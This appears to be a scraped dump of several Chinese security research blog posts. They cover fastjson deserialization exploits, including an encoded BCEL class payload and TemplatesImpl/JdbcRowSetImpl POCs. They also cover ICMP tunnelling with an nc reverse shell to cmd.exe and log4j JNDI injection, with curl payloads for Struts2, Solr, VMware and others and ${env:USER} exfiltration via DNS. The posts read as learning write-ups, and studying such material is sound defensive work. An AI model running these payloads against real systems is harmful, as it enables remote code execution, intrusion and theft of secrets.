\\\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\\\"\\n\" + \" }\\n\" + \" }: \\\"x\\\"\\n\" + \"}\"; JSON.parse(payload2); }} 直接跟进到com.alibaba.fastjson.parser.DefaultJSONParser#parseObject，当反序列化的对象为JSONObject时，会调用键的toString方法。此时的键是键为x，值为BasicDataSource对象的JSONObject对象。 跟进com.alibaba.fastjson.JSON#toString，返回的是它的toJSONString方法的值。接着又套娃调用了三次write方法，来到了com.alibaba.fastjson.serializer.ASMSerializer_1_BasicDataSource#write。IDEA并么有识别出ASMSerializer_1_BasicDataSource的源码，也就是com.alibaba.fastjson.serializer下并没有这个类。 回到com.alibaba.fastjson.serializer.MapSerializer#write调用serializer属性的getObjectWriter方法处跟进，发现最终调用的是com.alibaba.fastjson.serializer.SerializeConfig#createASMSerializer，ASMSerializerFactory工厂类生成了BasicDataSource的ASMSerializer专属子类ASMSerializer_1_BasicDataSource。 关于ASMSerializer_1_BasicDataSource这个类，这里就涉及了一个知识点：ASM。 ASM是一个通用的Java字节码操作和分析框架，它可以用来修改现有的类或直接以二进制形式动态生成类。ASM提供了一些常见的字节码转换和分析算法，从中可以构建定制的复杂转换和代码分析工具。ASM提供了与其他Java字节码框架类似的功能，但侧重于性能。因为它的设计和实现都尽可能小和快，所以它非常适合在动态系统中使用（当然也可以以静态方式使用，例如在编译器中）。 生成这个类的write方法中会调用BasicDataSource类的getter方法，其中就有最开始调用栈中的org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection方法。接着跟进到org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory，当driverClassLoader非空时，会调用loader可控的forName重载方法。 此时的loader是BCEL的ClassLoader，这是一个神奇的ClassLoader。当反射的类名是$$BCEL$$开头时，会将类名剩余部分解码作为输入流，解析并返回一个Class实例，那么恶意类的静态代码中的恶意代码就会被执行。 回显在网上找到了两串BCEL回显的POC，使用BCEL自带的Utility工具类解码，保存为.class文件就可以用IDEA反编译直接看。解码Demo如下： 12345678public class BCELDecode { public static void main(String[] args) throws IOException { String encode = \"$l$8b$I$A$A$A$A$A$A$A...\"; byte[] decode = Utility.decode(encode,true); FileOutputStream fileOutputStream = new FileOutputStream(\"DecodeClass.class\"); fileOutputStream.write(decode); }} 先来看看Spring获取request和response的办法，是一种较为通用的方法。Spring在请求预处理调用processRequest方法的时候，会将request和response放进RequestContextHolder的线程局部变量里，所以当前线程的任何地方都可以取用到request和response。 在看看tomcat的回显，代码稍长，利用的是c0ny1师傅提出的一种方法，深度优先搜索遍历当前线程的所有属性找到request和response，是tomcat上一种较为通用的回显方法。详细的分析可以在c0ny1的文章：半自动化挖掘 request 实现多种中间件回显中看到，这里就不展开说。 以上两种方法都用Thread.currentThread().getContextClassLoader()获取上下文类加载器来加载类，个人的理解呢，是因为Java的双亲委派机制。直接使用Class.forName加载的话，在反序列化或加载内存马的点的类加载器是spring和tomcat类的类加载器的parent类加载器，或是与他平行的分支，直接用Class.forName就无法加载到spring和tomcat的类。 而Spring和tomcat又因为不同Web应用不同版依赖本共存、动态加载jsp等一些原因打破了双亲委派机制，会将当前线程的上下文类加载器设置为他们各自的Web应用类加载器，刚好就能通过上下文类加载器加载到想要的Spring和tomcat类。 以上是个人对上下文类加载器在回显中作用的个人理解，若其中有误，欢用各位师傅斧正。 后记以上涉及的知识点也就是BCEL的Classloader特性、双亲委派机制和打破双亲委派的方法，好像也没什么，但这段时间的心路历程让我想起来王家卫东邪西毒里的一句 每个人都会经历这个阶段：看见一座山，就想知道山后面是什么。我很想告诉他，可能翻过去山后面，你会发觉没有什么特别。回头看，会觉得这一边更好。但我知道他不会听，以他的性格，自己不试过，又怎么会甘心？ 参考https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html https://github.com/depycode/fastjson-local-echo https://segmentfault.com/a/1190000040160637 https://segmentfault.com/a/1190000040188046 https://paper.seebug.org/1181/","link":"/2021/11/25/fastjson不出网利用简析/"},{"title":"fastjson反序列化漏洞学习","text":"前言fastjson反序列化，JAVA安全绕不过的坎。 反序列化原理一般情况下，fastjson反序列化的结果是一个JSONObject的对象，但在序列化时设置SerializerFeature为WriteClassName，序列化的字符串就会多一个@type的键值对，在反序列化时就会按照@type的值，返回相应的对象。 实验代码和运行结果如下，可以看到当反序列化的方法为parse和parseObject且传入参数为json字符串和Class实例时，会自动调用给定类的构造方法和setter方法；当放序列化方法为parseObject且只传入json字符串时，会调用给定类的构造方法、setter方法和全部的getter方法。 1234567891011public static void main(String[] args){ TestClass testClass = new TestClass(); String json = JSON.toJSONString(testClass, SerializerFeature.WriteClassName); System.out.println(json); System.out.println(\"---------------------------\"); JSON.parse(json); System.out.println(\"---------------------------\"); JSON.parseObject(json); System.out.println(\"---------------------------\"); JSON.parseObject(json,TestClass.class);} 综上，构造payload的入口类的构造方法、setter方法或getter方法需要具有实现想要功能的代码，或可通过这些方法跳转到中间衔接类或目的实现类。 POC分析fastjson在1.2.24下有两个通用的payload：JdbcRowSetImpl和TemplatesImpl。 JdbcRowSetImpl从以下payload可以看出是通过JNDI注入实现命令执行的，搭好RMI服务后，在Runtime的exec方法下个断点。 1{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:8888/Calc&quot;,&quot;autoCommit&quot;:true} 调用栈很简单，在setAutoCommit方法调用connnet方法，而connnet方法又使用我们设置的JNDI字符串调用lookup方法，加载恶意的工厂类导致命令执行。当然也因为是JNDI的利用方式，在一些低版本JDK环境下才能利用成功。 TemplatesImplTemplatesImpl的POC构造比JdbcRowSetImpl复杂些，而且对反序列化的SerializerFeature参数有要求，使用parseObject时需要JSON.parseObject(json, Object.class, Feature.SupportNonPublicField)，parse方法时需要JSON.parse(json,Feature.SupportNonPublicField)，但好处就是无需出网加载恶意类。 下面是利用代码，同样在exec方法下断点继续调试。 1234567891011121314151617181920public class Templates { public static void main(String args[]) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.get(evil.class.getName()); String code = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; ctClass.makeClassInitializer().insertBefore(code); String randomClassName = \"p1ay2win\" + System.nanoTime(); ctClass.setName(randomClassName); ctClass.setSuperclass((classPool.get(AbstractTranslet.class.getName()))); byte[] evilCode = ctClass.toBytecode(); String encode = Base64.encodeBase64String(evilCode); String json = \"{\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\", \\\"_bytecodes\\\": [\\\"\" + encode + \"\\\"], \\\"_name\\\": \\\"p1ya2win\\\", \\\"_tfactory\\\": { }, \\\"_outputProperties\\\":{ }}\"; System.out.println(json); JSON.parseObject(json, Object.class, Feature.SupportNonPublicField); } public static class evil { }} 调用栈显示设置outputProperties而调用它的setter方法，接着再陆续调用newTransformer方法和getTransletInstance方法。主要的代码在getTransletInstance方法中，实例化_class数组里相应的Class实例。而_class数组我们是没有在json中设置的，它的赋值是在上面的defineTransletClasses方法。 跟进defineTransletClasses方法，会通过TransletClassLoader的defineClass将我传入的_bytecodes字节转换为Class实例，但在这之前和之后会调用_tfactory的方法和判断_transletIndex是否小于0。这时可以利用fastjson自动实例化传空值的属性的类型的特性，将_tfactory初始化，然后_transletIndex的问题，可以令恶意类的父类为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl在if里给_transletIndex赋值。还有个_name属性，在getTransletInstance方法里判断为空则会返回空，不会进入到实例化的方法里，在这里给_name属性赋任意字符串值即可。 还有个问题就是，payload里_bytecodes的值为数组套个base64的字符串，但在TemplatesImpl里_bytecodes的类型是二维数组字节。通过别的文章得知fastjson是使用自己的IOUtils工具类实现base64解码的，在相应的方法下断点。ObjectArrayCodec的deserialze方法调用JSONScanner的bytesVAlues方法进行base64解码。 再往上几层跟进到DefaultFieldDeserializer的parseField方法，根据不同的fieldValueDeserilizer值通过deserialze反序列化获取属性的值。而fieldValueDeserilizer的值又是从ParserConfig的getDeserializer方法获取，在这个方法里，数组类型的属性会返回ObjectArrayCodec实例的derializer。ObjectArrayCodec会像调用栈所示那样，对数组类型属性的base64值解码还原。 属性的问题明了了，回到TemplatesImpl的getTransletInstance方法，实例化_classClass实例数组里的类，执行类恶意类里的静态方法，至此利用结束。 后记平庸这东西犹如白衬衣上的污痕，一旦染上便永远洗不掉，无可挽回 参考https://y4er.com/post/fastjson-learn/ https://www.cnblogs.com/chengez/p/14789477.html https://www.cnblogs.com/0x7e/p/14400933.html https://paper.seebug.org/1242/#commonscollections-2","link":"/2021/10/31/fastjson反序列化漏洞学习/"},{"title":"ICMP隧道学习笔记","text":"原理ICMP协议通常用于返回的错误信息或是分析路由，ping和traceroute使用的就是这个协议。通常两台设备通信需要通过端口，但在ICMP协议下就不需要，依据这个特点可绕过IDS、IPS等设备。 icmpshicmpsh是基于ICMP协议，可在攻击者服务器跨平台运行的Windows反弹shell工具。下面其是github上的项目地址。 https://github.com/inquisb/icmpsh 使用方法把icmpsh项目从github上下载下来，把其中的icmpsh.exe上传到目标主机。 Linux作为攻击者服务器则需要安装python的impacket库，我的Parrot系统上已将安装好了。 12sudo apt install python-impacket run.sh脚本里获取网卡和ip地址的方法在我的系统里无效，于把获取命令稍微改了一下，我的网卡名是eth0。 12IP=$(ifconfig \"eth0\" |grep \"inet \"| awk '{ print $2 }') 接着以管理员权限运行run.sh脚本，输入目标主机的ip地址，复制给出的命令到目标主机运行。 目标主机执行命令后成功反弹shell。 其实直接运行项目下的icmpsh_m.py效果也是一样的，不过要先手动关闭ping命令的ICMP应答。 1234sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1sudo python icmpsh_m.py ATTACKER_IP VICTIM_IP 数据包分析使用tcpdump抓下192.168.189.129和192.168.189.135之间的所有数据包。 12sudo tcpdump ip host 192.168.189.129 and 192.168.189.135 -w /tmp/icmp.cap 用wireshark打开再去到的数据，可以看到两台主机之间的数据包的协议都是ICMP。 找到了对输入命令请求和响应的两个包，发现他们的内容都明文存储在ICMP报文的Data结构处。 杀软查杀情况由于能够直接反弹shell，在virustotal几乎一半的厂商都报毒了。 使用源码从新编译的上传上去试试，只有一个厂商报毒。 ptunnel与icmpsh一样，ptunnel也是基于ICMP协议的工具，但ptunnel是一个纯粹的ICMP隧道，能实现正向隧道的功能。经我测试icmpsh需要两台机器都是公网的才能反弹shell，ptunnel就没这个问题，但使用这个需要管理员权限。Kali和Parrot已有这个工具，也有Windows版，需要自己编译，但无论是我自己编译的，还是GitHub上编译好的都没法在Windows2012上运行，倒是能在Windows10上运行，不知道是不是编译环境的问题，还是他WinPcap库的问题。 https://github.com/ptunnel-win/ptunnel（非官方，貌似官方没发在GitHub上） 自己编译要装好MinGW。 编译方法：把项目clone下来，再把WinPcap库下载下来，放到同一个项目文件夹里，在使用如下命令编译。 12gcc ptunnel.c md5.c -L\".\\WpdPack\\Lib\" -I\".\\WpdPack\\Include\" -lwpcap -lwsock32 -g -Wall -DWIN32 -o ptunnel.exe 使用方法反弹shell服务端： 12sudo ptunnel 客户端： 12ptunnel.exe -p SERVER_IP -lp 8888 -da SERVER_IP -dp 8888 服务的出现建立Session的字样既成功建立ICMP隧道。 现在测试下再目标主机反弹个shell，先在攻击者主机监听指定端口，然后再在目标主机用nc反弹个shell到本地监听的端口。注意顺序不对可能连接不上，玄学问题。 12345678server:nc -lvpclient:nc.exe 127.0.0.1 3399 -e C:\\Windows\\System32\\cmd.exe 映射3389既然都建立了ICMP隧道了，仅仅反弹个shell肯定是不够的，下面就试试内网3389通过ICMP隧道映射到外网。以下是拓扑图： 先在Attacker主机开启ptunnel。 12sudo ptunnel 再在Server主机ptunnel作为服务端开启本地监听端口。 12ptunnel.exe -p 192.168.3.65 -lp 3399 -da 192.168.3.65 -dp 3399 接着在Attacker主机使用lcx类的工具，开启监听模式。这里的lcx类工具我使用的是NATBypass，用go编写，编译成不同可执行文件后可跨平台使用。 https://github.com/cw1997/NATBypass 12./nb -listen 3399 3389 最后在Server主机使用slave模式，转发3389到ptunnel本地监听的端口。 12nb.exe -slave 127.0.0.1:3389 127.0.0.1:3399 出现accept a new client字样，既成功建立连接。 小结通过ICMP隧道映射3389就这简简单单几条命令，但是遇到命令执行顺序和，一开始使用的GitHub上用C写的跨平台lcx，同网段能通过隧道，不同网段不能的问题，排查起来花了一天，wtcl。 数据包分析用wireshark抓下反弹shell时的数据包。没有使用密码时，数据包内容跟icmpsh一样，都是明文写在ICMP报文的Data结构里，但是Data结构里还有几十字节的其他内容，可能是记录转发ip和端口之类的内容。 使用密码时反弹shell的数据包是一样的，可能是在建立隧道时才进行一次密码确认。 杀软查杀情况ptunnel在virustotal上有五个厂商报毒，其中一个识别出来是ptunnel，总体问题不大。（我怎么记得昨天才有两个报毒的呢-_-!） 其他工具其他类似工具有pingtunnel，用go编写，支持转发tcp、udp和sock5，能够开平台使用。不过我用这个想把3389映射出来时，遇到点问题，没映射成功。 后记以前不知道ping和traceroute有的是什么协议，现在知道了是他们特有的ICMP协议，通过ICMP还了解到这么多妙用:D","link":"/2020/06/25/icmp_tunnel_learning_note/"},{"title":"log4j漏洞分析","text":"前言2021 年 12 月 10 日，Apache发布了其 Log4j 框架的 2.15.0 版，其中包括对 CVE-2021-44228 的修复，这是一个影响 Apache Log4j 2.14.1 及更早版本的关键 (CVSSv3 10) 远程代码执行 (RCE) 漏洞。该漏洞存在于 Log4j 处理器处理特制日志消息的方式中。不可信的字符串（例如，来自输入文本字段的字符串，例如 Web 应用程序搜索框）包含的内容${jndi:ldap://example.com/a}，如果启用了消息查找替换，将触发远程类加载、消息查找和相关内容的执行。成功利用 CVE-2021-44228 可以让未经身份验证的远程攻击者完全控制易受攻击的目标系统。 简介Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。 Lookup提供了一种在任意位置向 Log4j 配置添加值的方法。它们是实现StrLookup接口的特定类型的插件。Lookup语法为${prefix:name}，其中前缀标识告诉Log4j应在特定上下文中使用的变量名称。 前缀 上下文 bundle 资源束。格式为bundle:BundleName:BundleKey。捆绑包名称遵循包命名约定，如： {bundle:com.domain.Messages:MyKey}。 ctx 线程上下文映射（MDC）。 date 使用指定的格式插入当前日期和/或时间。 env 系统环境变量。 jndi 在默认的JNDI上下文中设置的值。 jvmrunargs 通过JMX访问的JVM输入参数，但不是主要参数; 请参阅RuntimeMXBean.getInputArguments在Android上不可用 log4j Log4j配置属性。表达式log4j:configLocation和log4j:configLocation和{log4j:configParentLocation}分别提供给log4j的配置文件和它的父文件夹的绝对路径。 main 使用 MapLookup.setMainArguments(String[])设置的值。 map 来自MapMessage的值。 sd 来自StructuredDataMessage的值。“id”将返回没有企业号的StructuredDataId的名称。“type”将返回消息类型。其他键将从Map中取回单个元素。 sys 系统属性。 漏洞分析漏洞触发选用log4j-core 2.14.1版本，使用以下代码作为demo。启动一个恶意的RMI或LDAP服务，执行demo即可触发。 1234567891011import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.LogManager;public class Log4jJNDI { private static final Logger logger = LogManager.getLogger(Log4jJNDI.class); public static void main(String[] args) { System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); logger.error(\"${jndi:rmi://127.0.0.1:8888/Calc}\"); }} 代码分析跟进到org.apache.logging.log4j.core.pattern.MessagePatternConverter#format，若未设置nolookup为true，遍历要输出的日志，$符号和{符号相继出现则会在后续将花括号中的内容作处理。nolookup在log4j 2.15.0之前是默认关闭的。 再跟进到org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute，在这里会从外到内递归${和}内的内容，然后使用通了中的resolveVariable方法解析并返回它的值。 在resolveVariable方法里支持解析的前缀有date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，实测在Spring框架下支持解析的前缀会有所不同。 继续跟进org.apache.logging.log4j.core.lookup.Interpolator#lookup，根据前缀从strLookupMap属性中获取相应的Lookup类实例。这里获取的是JndiLookup的实例，并调用该实例的lookup方法。 JndiLookup的lookup方法里，调用org.apache.logging.log4j.core.net.jndiManager的getDefaultManager静态方法，返回JndiManager实例，其中的context属性被设置为InitialContext对象。 然后调用JndiManager实例的lookup方法，实际就是它的context属性InitialContext的lookup方法，后续流程就如常规JNDI注入，加载远程的恶意类执行其中的恶意代码。 RC1修复绕过log4j在RC1中对JNDI注入问题的修复存在于github的commit记录LOG4J2-3201中。在JndiManager类里对反序列化的类和JNDI服务器地址做了白名单校验。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public synchronized &lt;T&gt; T lookup(final String name) throws NamingException { try { URI uri = new URI(name); if (uri.getScheme() != null) { if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) { LOGGER.warn(\"Log4j JNDI does not allow protocol {}\", uri.getScheme()); return null; } if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) { if (!allowedHosts.contains(uri.getHost())) { LOGGER.warn(\"Attempt to access ldap server not in allowed list\"); return null; } Attributes attributes = this.context.getAttributes(name); if (attributes != null) { // In testing the \"key\" for attributes seems to be lowercase while the attribute id is // camelcase, but that may just be true for the test LDAP used here. This copies the Attributes // to a Map ignoring the \"key\" and using the Attribute's id as the key in the Map so it matches // the Java schema. Map&lt;String, Attribute&gt; attributeMap = new HashMap&lt;&gt;(); NamingEnumeration&lt;? extends Attribute&gt; enumeration = attributes.getAll(); while (enumeration.hasMore()) { Attribute attribute = enumeration.next(); attributeMap.put(attribute.getID(), attribute); } Attribute classNameAttr = attributeMap.get(CLASS_NAME); if (attributeMap.get(SERIALIZED_DATA) != null) { if (classNameAttr != null) { String className = classNameAttr.get().toString(); if (!allowedClasses.contains(className)) { LOGGER.warn(\"Deserialization of {} is not allowed\", className); return null; } } else { LOGGER.warn(\"No class name provided for {}\", name); return null; } } else if (attributeMap.get(REFERENCE_ADDRESS) != null || attributeMap.get(OBJECT_FACTORY) != null) { LOGGER.warn(\"Referenceable class is not allowed for {}\", name); return null; } } } } } catch (URISyntaxException ex) { // This is OK. } return (T) this.context.lookup(name); } 但这个修复存在问题，如果new URI(name)抛出了URISyntaxException异常，则会跳过白名单校验直接调用lookup。URI加不编码的空格可以触发URISyntaxException跳出try catch直接执行lookup，但在lookup里会去掉空格，正常触发JNDI注入。 1${jndi:ldap://127.0.0.1:1389/ badClassName} 其他利用方式读取敏感信息log4j中的两个前缀sys和env，是分别通过System.getProperty()和System.getenv()实现的，能够获取环境变量和系统属性，再配合Out-of-Band，就能读取到环境变量和系统属性中的敏感信息。 POC 1${jndi:ldap://${env:USER}.dnslog.cn/abc} 读取配置文件bundle前缀ResourceBundleLookup中会把 key 按照 :分割成两份，第一个是 bundleName 获取 ResourceBundle，第二个是 bundleKey 获取 Properties Value。 bundle前缀在只引入log4j的项目上默认不支持，测试在spring框架里支持。 POC 1${jndi:ldap://${bundle:bundleName:bundleKey}.ed7yce.dnslog.cn/abc} 受影响组件触发方式struts2 检查请求路径触发 在struts2-core包的org.apache.struts2.dispatcher.mapper#cleanupActionName中，检查action名的范围是否在[a-zA-Z0-9._!/\\-]内，若存在访问之外的字符，则会将action名输出到WARN日志中。 12345678protected String cleanupActionName(String rawActionName) { if (this.allowedActionNames.matcher(rawActionName).matches()) { return rawActionName; } else { LOG.warn(\"{} did not match allowed action names {} - default action {} will be used!\", rawActionName, this.allowedActionNames, this.defaultActionName); return this.defaultActionName; }} 在请求路径中两个相邻的/会被转换为一个/，将其中一个/替换为${::-/}可防止被转换。 有的struts2版本的相同类中还存在cleanupNamespaceName方法，利用方式相同。 POC 1http://localhost:8080/helloworld_war/$%7Bjndi:rmi:$%7B::-/%7D/127.0.0.1:8888/Calc%7D/ 检查请求参数长度 在struts2-core包的com.opensymphony.xwork2.interceptor#isWithinLengthLimit中，访问一个存在的action，会检查请求参数名的长度，若长度超过默认的100个字符，请求参数名则会输出到debug日志中。 12345678protected boolean isWithinLengthLimit(String name) { boolean matchLength = name.length() &lt;= this.paramNameMaxLength; if (!matchLength) { LOG.debug(\"Parameter [{}] is too long, allowed length is [{}]\", name, String.valueOf(this.paramNameMaxLength)); } return matchLength;} POC 1http://localhost:8080/helloworld_war/hello.action?$%7Bjndi:rmi://127.0.0.1:8888/Calc%7Daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=123 获取静态文件If-Modified-Since头 struts2在org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter#doFilter拦截一个请求，且请求的路径不在排除的路径内，则会先调用execute属性的executeStaticResourceRequest方法，判断是否为静态文件。 在org.apache.struts2.dispatcher.ExecuteOperations#executeStaticResourceRequest里，请求以struts或static开头则会交给DefaultStaticContentLoader的findStaticResource处理。 findStaticResource方法中，静态文件会从struts2 core的org.apache.struts.static包下找，然后会交给同类的process方法处理。该包存在以下静态文件。 tooltip.gif domtt.css utils.js domTT.js inputtransfersselect.js optiontransferselect.js process方法里，静态文件输入流非空时，则会尝试将请求头If-Modified-Since的值转为Date类型，当转换失败抛出异常，If-Modified-Since的值就会输出到WARN日志中。 我们访问struts2中默认的静态文件，并设置If-Modified-Since头为非Date类型即可触发log4j漏洞。 POC 1curl -vv -H &quot;If-Modified-Since: \\${jndi:rmi:\\${::-/}/localhost:8888/Calc}&quot; http://192.168.217.1:8080/helloworld_war/struts/utils.js vmware1curl --insecure -vv -H &quot;X-Forwarded-For: \\${jndi:ldap://10.0.0.3:1270/lol}&quot; &quot;https://10.0.0.4/websso/SAML2/SSO/photon-machine.lan?SAMLRequest=&quot; slor12curl &apos;http://localhost:8983/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&amp;wt=json&apos;curl &apos;http://localhost:8983/solr/admin/cores?action=CREATE&amp;name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D&amp;wt=json&apos; James12echo 233 &gt; email.txtcurl --url &quot;smtp://localhost&quot; --user &quot;test:test&quot; --mail-from &apos;${jndi:ldap://localhost:1270/abc}@gmail.com&apos; --mail-rcpt &apos;test&apos; --upload-file email.txt Druid1curl -vv -X DELETE &apos;http://localhost:8888/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2flocalhost:1270%2fabc%7d&apos; JSPWiki1curl -vv http://localhost:8080/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/ OFBiz1curl --insecure -vv -H &quot;Cookie: OFBiz.Visitor=\\${jndi:ldap://localhost:1270/abc}&quot; https://localhost:8443/webtools/control/main 后记在成文那天早上，@su18师傅在群里发布log4j详细分析文章，其中还有log4j 1.x的JNDI利用思路，虽然实现条件挺苛刻，但不得不感叹师傅们真的细。 这篇文章写下来就花了一天半的时间，比以往快了不少，转了安全研究岗还是有挺多时间学东西的，虽然也有怕leader催的缘故。😂 参考https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg https://lorexxar.cn/2021/12/10/log4j2-jndi/#2-15-0-rc1-%E7%9A%84%E4%BF%AE%E5%A4%8D https://xz.aliyun.com/t/10649#toc-2 https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis","link":"/2021/12/16/log4j漏洞分析/"},{"title":"php反序列化浅析","text":"前言进阶的代码审计，反序列化是绕不过的坎啊。主流的几个Web开发语言，像php、C#、Java都有反序列化，其中就属php的反序列化简单易懂，反序列化的学习之路就从这里开始。 什么是反序列化如果想要持久化保存一个对象，除了将对象的内容保存在数据库中，还能将对象序列化，使其转换为一串数据。序列化使得对象的保存和传输变得更为简便，其中序列化的对象可以是类对象、变量、数组等。对象的还原则通过反序列化实现。 PHP反序列化格式序列化的对象有不同的类型，为了区分不同的类型，序列化的字符串自然有不同的格式。php常见的类型序列化后的内容如下： 1234567891011121314151617181920212223&lt;?php$str = \"str\";$int = 1;$float = 1.1;$obj = new DateTime();$arr = array(1);$bool = true;$null = null;echo serialize($str);echo \"&lt;br&gt;\";echo serialize($int);echo \"&lt;br&gt;\";echo serialize($float);echo \"&lt;br&gt;\";echo serialize($obj);echo \"&lt;br&gt;\";echo serialize($arr);echo \"&lt;br&gt;\";echo serialize($bool);echo \"&lt;br&gt;\";echo serialize($null) 开头的一个字符代表类型，后面跟着一个冒号:用于分隔类型和值；对于字符串类型、变量名和类名，代表类型的字符后还跟着一个数字，用于描述后面字符串的长度；相同的，类对象和数组也存在一个数字用于描述类对象属性数量或数组长度，其中属性或数组内容用一对花括号括起来，花括号里可以嵌套其他类型的序列化内容 。 除此之外还有两个不常见，但值得关注的类型描述符：大写S和大写R，大写S可以传入hex编码的字符，大写R可以从左到右与第n个反序列化的变量进行绑定。 123456789101112&lt;?php$hex = 'S:3:\"\\31\\32\\33\";';$res = 'a:2:{s:3:\"abc\";s:3:\"abc\";s:3:\"res\";R:2;}';echo unserialize($hex);echo \"&lt;br&gt;\";$arr = unserialize($res);echo var_dump($arr);echo \"&lt;br&gt;\";$arr[\"abc\"] = \"def\";echo var_dump($arr) 对于php的类，其属性的访问修饰符有三种：public、protected和private，序列化区分访问修饰符是通过属性的标记实现的。序列化时可能会看到属性名的长度和描述的长度不一致，是因为protected和private修饰的变量名在经过序列化后包含了不可见的00字符。 下列代码将序列化后的00字符替换为url编码，就可以很直观的看到它的位置。protected修饰符的格式为：%00*%00属性名，private修饰符的格式为：%00类名%00属性名，public修饰符则直接为属性名。 12345678910&lt;?phpclass Test{ public $public; protected $protected; private $private;}echo str_replace(\"\\x00\",\"%00\",serialize(new Test())); PHP魔术函数反序列化不会直接控制代码的执行流程，但通过特定条件下会被自动调用的魔术方法构成POP链，可以实现命令执行、文件读写等功能。PHP中所有的魔术方法和作用如下： 方法名 作用 __construct 构造函数，在创建对象时候初始化对象，一般用于对变量赋初值 __destruct 析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用 __toString 当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如echo打印出对象就会调用此方法 __wakeup 使用unserialize时触发，反序列化恢复对象之前调用该方法 __sleep 使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化) __call 在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法 __callStatic 在静态上下文中调用不可访问的方法时触发 __get 读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性） __set 在给不可访问属性赋值时，即在调用私有属性的时候会自动执行 __isset 当对不可访问属性调用isset()或empty()时触发 __unset 当对不可访问属性调用unset()时触发 __invoke 当脚本尝试将对象调用为函数时触发 __serialize serialize()函数会检查类中是否存在一个魔术方法 __serialize()。如果存在，该方法将在任何序列化之前优先执行。如果类中同时定义了 __serialize() 和 __sleep() 两个魔术方法，则只有 __serialize() 方法会被调用。 __unserialize unserialize()函数检查是否存在魔术方法__unserialize()。如果存在，此函数将接收从__serialize()返回的数组，然后根据需要从该数组中恢复对象的属性。 __set_status 起当调用 var_export()导出类时，此方法会被调用。 __clone 使用clone关键字来进行对象复制时__clone方法会被调用。 __debugInfo 使用var_dump()函数输出一个对象的属性时__debuginfo方法会被调用。 魔术方法触发的方法如下： 